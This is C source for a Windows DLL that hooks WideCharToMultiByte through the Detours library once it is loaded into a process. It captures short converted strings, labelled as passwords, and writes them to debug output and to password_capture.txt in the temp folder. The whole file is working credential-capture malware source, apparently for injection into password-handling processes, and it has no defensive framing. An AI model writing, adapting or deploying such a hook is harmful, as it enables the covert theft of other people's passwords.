
#include <stdio.h>
#include <windows.h>
#include "detours.h"

// OutputDebugStringA needed to log into debug view
char pathToDLL[512] = "";

void GetPathToDLL(){
	GetTempPathA(512, pathToDLL);
	strcat(pathToDLL, "\\password_capture.txt");
	printf("\nPath To DLL: %s\n", pathToDLL);
}

//-- pointer to original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(
  UINT                               CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
)= WideCharToMultiByte;


BOOL HookTarget(void);
BOOL UnHookTarget(void);

//-- Hooking function
int HookedWideCharToMultiByte(UINT   CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar) {
	int ret;
	char passwordstr[512];
	HANDLE hFile = NULL;
	DWORD numBytes;

	ret = pWideCharToMultiByte(CodePage, dwFlags,lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	if(strlen(lpMultiByteStr)<32){
		sprintf(passwordstr, "PASSWD = %s\r\n", lpMultiByteStr);
		OutputDebugStringA(passwordstr);
	}
	
	// store captured data in a file
	hFile = CreateFile(pathToDLL, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with password file\n");
	else
		WriteFile(hFile, passwordstr, strlen(passwordstr), &numBytes, NULL);
	CloseHandle(hFile);
	
	return ret;
}

//-- Set hook on WideCharToMultiByte
BOOL HookTarget(void) {
    LONG err;
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	OutputDebugStringA("WideCharToMultiByte() successfully hooked\n");
	
	return TRUE;
}

//-- Revert all changes to original code
BOOL UnHookTarget(void) {
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();
	OutputDebugStringA("Hook removed from WideCharToMultiByte()\n");
	
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
	GetPathToDLL(); 
    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			HookTarget();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookTarget();
			break;
	}
	
    return TRUE;
}

